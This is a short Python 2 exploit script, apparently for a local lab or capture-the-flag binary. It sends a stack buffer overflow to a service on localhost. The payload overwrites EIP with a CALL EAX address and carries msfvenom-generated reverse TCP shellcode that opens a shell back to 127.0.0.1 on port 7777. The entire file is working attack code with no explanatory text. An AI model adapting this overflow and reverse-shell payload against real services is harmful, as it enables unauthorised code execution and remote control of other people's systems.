#!/usr/bin/python

import socket
import sys

host = "127.0.0.1"
port = int(sys.argv[1])
EIP = "\x34\x87\x04\x08"

#CALL EAX = 0x08048734

#msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=7777 -b "\x00\x20\x0a\x0d" -f python
#Payload size: 95 bytes

buf = b""
buf += b"\xbf\x58\xa8\xb3\xc4\xd9\xc4\xd9\x74\x24\xf4\x5e\x31"
buf += b"\xc9\xb1\x12\x83\xee\xfc\x31\x7e\x0e\x03\x26\xa6\x51"
buf += b"\x31\xe7\x6d\x62\x59\x54\xd1\xde\xf4\x58\x5c\x01\xb8"
buf += b"\x3a\x93\x42\x2a\x9b\x9b\x7c\x80\x9b\x95\xfb\xe3\xf3"
buf += b"\x5a\xfc\x13\x02\xcd\xfe\x13\x1a\x6c\x76\xf2\x92\x08"
buf += b"\xd8\xa4\x81\x67\xdb\xcf\xc4\x45\x5c\x9d\x6e\x38\x72"
buf += b"\x51\x06\xac\xa3\xba\xb4\x45\x35\x27\x6a\xc5\xcc\x49"
buf += b"\x3a\xe2\x03\x09"

buffer = "A" * 112 + EIP + "F" * 552 + "\x90" *10 + buf + "G"*(800-112-4-552-10-95)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))

print "Send buffer"
s.send(buffer)
print "buffer sent: " + buffer
s.close()